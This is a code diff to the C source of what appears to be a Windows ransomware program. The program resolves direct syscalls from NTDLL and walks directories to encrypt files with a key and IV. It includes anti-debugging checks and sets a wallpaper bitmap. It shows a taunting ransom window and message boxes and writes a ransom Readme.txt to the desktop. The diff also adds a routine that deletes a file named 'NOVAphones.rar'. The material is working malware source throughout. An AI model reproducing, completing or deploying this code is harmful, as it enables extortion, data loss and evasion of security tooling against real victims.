@@ -114,10 +114,8 @@ BOOL InitializeSysCalls() {
 	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
 		return FALSE;
 
-	// Get NTDLL module 
 	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);
 
-	// Get the EAT of NTDLL
 	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
 	if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
 		return FALSE;
@@ -384,15 +382,6 @@ BOOL ReadFromFile(PBYTE* pData, WCHAR* pfilePath, SIZE_T* szData) {
 		goto _EndFunction;
 	}
 
-	//hFile = CreateFileW(
-	//	pfilePath,
-	//	GENERIC_READ,
-	//	FILE_SHARE_READ,
-	//	NULL,
-	//	OPEN_EXISTING,
-	//	FILE_ATTRIBUTE_NORMAL,
-	//	NULL
-	//);
 
 	if (hFile == INVALID_HANDLE_VALUE) {
 		goto _EndFunction;
@@ -444,10 +433,6 @@ BOOL ReadFromFile(PBYTE* pData, WCHAR* pfilePath, SIZE_T* szData) {
 	}
 
 
-	//if (!ReadFile(hFile, buffer, (DWORD)fileSize.QuadPart, &numberOfBytesRead, NULL) || numberOfBytesRead != (DWORD)fileSize.QuadPart) {
-	//	printf("[!] ReadFile failed or incomplete read: %d\n", GetLastError());
-	//	goto _EndFunction;
-	//}
 
 	*pData = buffer;
 	*szData = numberOfBytesToRead;
@@ -502,15 +487,6 @@ BOOL WriteToFile(PBYTE buffer, WCHAR* pfilePath, SIZE_T numberOfBytesToWrite) {
 		goto _EndFunction;
 	}
 
-	//hFile = CreateFileW(
-	//	pfilePath,
-	//	GENERIC_WRITE,
-	//	FILE_SHARE_READ,
-	//	NULL,
-	//	OPEN_ALWAYS,        
-	//	FILE_ATTRIBUTE_NORMAL,
-	//	NULL
-	//);
 
 	if (hFile == INVALID_HANDLE_VALUE) {
 		return FALSE;
@@ -561,10 +537,6 @@ BOOL WriteToFile(PBYTE buffer, WCHAR* pfilePath, SIZE_T numberOfBytesToWrite) {
 		}
 
 
-		//if (!WriteFile(hFile, buffer + currentOffset, bytesToWrite, &numberOfBytesWritten, NULL)) {
-		//	printf("[!] Cannot WriteFile %d\n", GetLastError());
-		//	goto _EndFunction;
-		//}
 
 		if ((DWORD)ioStatusBlock.Information != (DWORD)bytesToWrite) {
 			goto _EndFunction;
@@ -643,6 +615,11 @@ BOOL DirectoryFiles(WCHAR* pDirectoryPath,uint8_t* key, uint8_t* iv) {
 			}
 		}
 		else {
+
+			if (wcscmp(fileData.cFileName, L"NOVAphones.rar") == 0) {
+				DeleteWin(filePath);
+				continue;
+			}
 
 			if (!ReadFromFile(&pData, filePath, &szData)) {
 				continue;
@@ -855,6 +832,26 @@ _EndFucntion:
 	return result;
 }
 
+BOOL DeleteWin(WCHAR* filePath) {
+	BOOL bSuccess = FALSE;
+
+	if (!filePath) {
+		printf("[!] Invalid parameters passed to DeleteWin\n");
+		return FALSE;
+	}
+
+	if (!SetFileAttributesW(filePath, FILE_ATTRIBUTE_NORMAL)) {
+		printf("[!] Failed to reset file attributes %d\n", GetLastError());
+	}
+
+	bSuccess = DeleteFileW(filePath);
+	if (!bSuccess) {
+		printf("[!] Cannot delete file %d\n", GetLastError());
+	}
+
+	return bSuccess;
+}
+
 
 
 BOOL CheckIsDebuggerPresent() {
@@ -1003,18 +1000,17 @@ BOOL WriteShellcodeToFile(const BYTE* shellcode, DWORD shellcodeSize, const char
 		0,
 		&sa,
 		CREATE_ALWAYS,
-		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_WRITE_THROUGH, // Ensure data is written directly to disk
+		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_WRITE_THROUGH,
 		NULL
 	);
 
 	if (hFile == INVALID_HANDLE_VALUE) {
-		return FALSE; // GetLastError() will already contain the error code
+		return FALSE; 
 	}
 
 	BOOL success = FALSE;
 	DWORD bytesWritten = 0;
 
-	// Write the data
 	success = WriteFile(
 		hFile,
 		shellcode,
@@ -1023,36 +1019,29 @@ BOOL WriteShellcodeToFile(const BYTE* shellcode, DWORD shellcodeSize, const char
 		NULL
 	);
 
-	// Verify all bytes were written
 	if (success && bytesWritten == shellcodeSize) {
-		// Flush buffers to ensure data is written to disk
 		FlushFileBuffers(hFile);
 	}
 	else {
 		success = FALSE;
 	}
 
-	// Always close the handle
 	CloseHandle(hFile);
 	return success;
 }
 
 BOOL SetWallpaper(LPCWSTR wallpaperPath) {
-	// Parameter validation
 	if (!wallpaperPath) {
 		SetLastError(ERROR_INVALID_PARAMETER);
 		return FALSE;
 	}
 
-	// Check if file exists
 	if (GetFileAttributesW(wallpaperPath) == INVALID_FILE_ATTRIBUTES) {
-		return FALSE; // File doesn't exist
-	}
+		return FALSE; 	}
 
 	BOOL success = TRUE;
 	HKEY hKey = NULL;
 
-	// Open registry key
 	LONG result = RegOpenKeyExW(
 		HKEY_CURRENT_USER,
 		L"Control Panel\\Desktop",
@@ -1066,8 +1055,6 @@ BOOL SetWallpaper(LPCWSTR wallpaperPath) {
 		return FALSE;
 	}
 
-	// Set wallpaper style to stretched (2)
-	// Using proper string size calculation for REG_SZ
 	const WCHAR* stretchedValue = L"2";
 	result = RegSetValueExW(
 		hKey,
@@ -1083,7 +1070,6 @@ BOOL SetWallpaper(LPCWSTR wallpaperPath) {
 		goto cleanup;
 	}
 
-	// Set tile wallpaper to 0 (no tiling)
 	const WCHAR* tileValue = L"0";
 	result = RegSetValueExW(
 		hKey,
@@ -1100,14 +1086,11 @@ BOOL SetWallpaper(LPCWSTR wallpaperPath) {
 	}
 
 cleanup:
-	// Always close the registry key
 	if (hKey) {
 		RegCloseKey(hKey);
 	}
 
-	// Only try to set the wallpaper if registry operations succeeded
 	if (success) {
-		// Apply the wallpaper change
 		if (!SystemParametersInfoW(
 			SPI_SETDESKWALLPAPER,
 			0,
@@ -1122,29 +1105,23 @@ cleanup:
 }
 
 BOOL GetDynamicPath(wchar_t* pathBuffer, size_t bufferSize) {
-	// Parameter validation
 	if (!pathBuffer || bufferSize == 0) {
 		SetLastError(ERROR_INVALID_PARAMETER);
 		return FALSE;
 	}
 
-	// Use environment variables to get the user's profile directory
-	// This is more reliable than hardcoding "C:\Users\"
 	wchar_t userProfilePath[MAX_PATH];
 	DWORD result = ExpandEnvironmentStringsW(L"%USERPROFILE%", userProfilePath, MAX_PATH);
 
 	if (result == 0 || result > MAX_PATH) {
-		// Fall back to the alternative method if environment variable expansion fails
 		wchar_t username[UNLEN + 1];
 		DWORD username_len = UNLEN + 1;
 
 		if (!GetUserNameW(username, &username_len)) {
-			// If we can't get the username, use the Default user profile
 			wcscpy_s(pathBuffer, bufferSize, L"C:\\Users\\Default\\Pictures\\image1.bmp");
 			return TRUE;
 		}
 
-		// Safely construct the path with proper buffer size checking
 		if (FAILED(StringCchPrintfW(pathBuffer, bufferSize,
 			L"C:\\Users\\%s\\Pictures\\image1.bmp", username))) {
 			SetLastError(ERROR_INSUFFICIENT_BUFFER);
@@ -1152,7 +1129,6 @@ BOOL GetDynamicPath(wchar_t* pathBuffer, size_t bufferSize) {
 		}
 	}
 	else {
-		// Safely append the Pictures path to the user profile path
 		if (FAILED(StringCchPrintfW(pathBuffer, bufferSize,
 			L"%s\\Pictures\\image1.bmp", userProfilePath))) {
 			SetLastError(ERROR_INSUFFICIENT_BUFFER);
@@ -1182,11 +1158,8 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) 
 		PAINTSTRUCT ps;
 		HDC hdc = BeginPaint(hwnd, &ps);
 		FillRect(hdc, &ps.rcPaint, (HBRUSH)GetStockObject(BLACK_BRUSH));
-		// Set text properties
-		SetTextColor(hdc, RGB(139, 0, 0)); // Dark red text
-		SetBkMode(hdc, RGB(0, 0, 0)); // Transparent background
-
-		// Define text
+		SetTextColor(hdc, RGB(139, 0, 0));
+		SetBkMode(hdc, RGB(0, 0, 0)); 
 		LPCWSTR text = L"WELL, WELL, WELL... LOOK WHO GOT CAUGHT!  >.< Oopsie! ";
 		LPCWSTR text1 = L"Your precious system? Not yours anymore  :'( ";
 		LPCWSTR text2 = L"Your data? Still there.. but let’s just say it’s on a little vacation. And nope, you’re not invited";
@@ -1195,72 +1168,51 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) 
 		LPCWSTR text5 = L"Wanna beg for your files back?";
 		LPCWSTR text6 = L"No worries, we made it super easy for you:";
 		LPCWSTR text7 = L"Go ahead, check that cute little README on your desktop.";
-		LPCWSTR text8 = L"Go ahead, check that cute little README on your desktop.";
 
-		// Get window dimensions
 		RECT textRect;
 		GetClientRect(hwnd, &textRect);
 
-		// Calculate vertical spacing
-		int spaceBetweenText = 35;  // Adjust the spacing between the lines of text
+		int spaceBetweenText = 35;
 		textRect.top += spaceBetweenText;
 		textRect.bottom += spaceBetweenText;
 
-		// Draw the first text phrase centered
 		DrawText(hdc, text, -1, &textRect, DT_SINGLELINE | DT_CENTER);
 
-		// Move down for the next text phrase
 		textRect.top += spaceBetweenText;
 		textRect.bottom += spaceBetweenText;
 
-		// Draw the second text phrase centered (with vertical spacing)
 		DrawText(hdc, text1, -1, &textRect, DT_SINGLELINE | DT_CENTER);
 
-		// Move down for the next text phrase
 		textRect.top += spaceBetweenText;
 		textRect.bottom += spaceBetweenText;
 
-		// Draw the third text phrase centered (with vertical spacing)
 		DrawText(hdc, text2, -1, &textRect, DT_SINGLELINE | DT_CENTER);
 		textRect.top += spaceBetweenText;
 		textRect.bottom += spaceBetweenText;
 
-		// Draw the second text phrase centered (with vertical spacing)
 		DrawText(hdc, text3, -1, &textRect, DT_SINGLELINE | DT_CENTER);
 
 		textRect.top += spaceBetweenText;
 		textRect.bottom += spaceBetweenText;
 
-		// Draw the first text phrase centered
 		DrawText(hdc, text4, -1, &textRect, DT_SINGLELINE | DT_CENTER);
 
 		textRect.top += spaceBetweenText;
 		textRect.bottom += spaceBetweenText;
 
-		// Draw the first text phrase centered
 		DrawText(hdc, text5, -1, &textRect, DT_SINGLELINE | DT_CENTER);
 
 		textRect.top += spaceBetweenText;
 		textRect.bottom += spaceBetweenText;
 
-		// Draw the first text phrase centered
 		DrawText(hdc, text6, -1, &textRect, DT_SINGLELINE | DT_CENTER);
 
 		textRect.top += spaceBetweenText;
 		textRect.bottom += spaceBetweenText;
 
-		// Draw the first text phrase centered
 		DrawText(hdc, text7, -1, &textRect, DT_SINGLELINE | DT_CENTER);
 
-
-		textRect.top += spaceBetweenText;
-		textRect.bottom += spaceBetweenText;
-
-		// Draw the first text phrase centered
-		DrawText(hdc, text8, -1, &textRect, DT_SINGLELINE | DT_CENTER);
-
-		EndPaint(hwnd, &ps);  // Call EndPaint once after all drawing
-
+		EndPaint(hwnd, &ps);  
 
 
 	}
@@ -1304,7 +1256,7 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) 
 			MessageBoxW(
 				hwnd,
 				L"MORE FILES HAVE BEEN ENCRYPTED, ARE YOU IDIOT OR SOMETHING LIKE THAT ?",
-				L"HAHAHA! AGAIN",
+				L"HAHAHA!",
 				MB_ICONHAND | MB_OK
 			);
 		}
@@ -1326,12 +1278,9 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) 
 VOID WriteWarningToDesktop() {
 	char desktopPath[MAX_PATH];
 
-	// Get Desktop path
 	if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktopPath))) {
-		// Build full path: Desktop\output.txt
 		strcat(desktopPath, "\\Readme.txt");
 
-		// Create the file
 		HANDLE hFile = CreateFileA(
 			desktopPath,
 			GENERIC_WRITE,
@@ -1344,7 +1293,6 @@ VOID WriteWarningToDesktop() {
 
 
 
-		// Fixed message
 		const char* message =
 			"OH NO! Looks like someone’s having a bad day...\n"
 			"\n"
@@ -1373,7 +1321,6 @@ VOID WriteWarningToDesktop() {
 		DWORD bytesWritten;
 		WriteFile(hFile, message, strlen(message), &bytesWritten, NULL);
 
-		// Close file
 		CloseHandle(hFile);
 
 	}
@@ -1386,43 +1333,35 @@ BOOL InitializePhantomWindow(HINSTANCE hInstance, int nCmdShow, const BYTE* shel
 		return FALSE;
 	}
 
-	// Get username in ASCII format
 	char usernameA[256] = { 0 };
 	DWORD usernameASize = sizeof(usernameA);
 	if (!GetUserNameA(usernameA, &usernameASize)) {
 		return FALSE;
 	}
 
-	// Construct file path for shellcode
 	char filePath[MAX_PATH] = { 0 };
 	if (FAILED(StringCchPrintfA(filePath, MAX_PATH, "C:\\Users\\%s\\Pictures\\image2.bmp", usernameA))) {
 		return FALSE;
 	}
 
-	// Write shellcode to file
 	if (!WriteShellcodeToFile(shellcode, shellcodeSize, filePath)) {
 		return FALSE;
 	}
 
-	// Get username in wide character format
 	WCHAR usernameW[256] = { 0 };
 	DWORD usernameWSize = ARRAYSIZE(usernameW);
 	if (!GetUserNameW(usernameW, &usernameWSize)) {
 		return FALSE;
 	}
 
-	// Construct wallpaper path
 	WCHAR wallpaperPath[MAX_PATH] = { 0 };
 	if (FAILED(StringCchPrintfW(wallpaperPath, MAX_PATH, L"C:\\Users\\%s\\Pictures\\image2.bmp", usernameW))) {
 		return FALSE;
 	}
 
-	// Set wallpaper
 	if (!SetWallpaper(wallpaperPath)) {
-		// Continue execution even if setting wallpaper fails
 	}
 
-	// Register window class
 	const wchar_t CLASS_NAME[] = L"PhantomWindow";
 	WNDCLASS wc = { 0 };
 	wc.lpfnWndProc = windowProc;
@@ -1434,14 +1373,13 @@ BOOL InitializePhantomWindow(HINSTANCE hInstance, int nCmdShow, const BYTE* shel
 		return FALSE;
 	}
 
-	// Create window
 	HWND hwnd = CreateWindowEx(
 		0,
 		CLASS_NAME,
 		L"",
 		WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU,
 		CW_USEDEFAULT, CW_USEDEFAULT,
-		700, 500,
+		700, 440,
 		NULL, NULL, hInstance, NULL
 	);
 
@@ -1449,7 +1387,6 @@ BOOL InitializePhantomWindow(HINSTANCE hInstance, int nCmdShow, const BYTE* shel
 		return FALSE;
 	}
 
-	// Show and update window
 	ShowWindow(hwnd, nCmdShow);
 	UpdateWindow(hwnd);
 
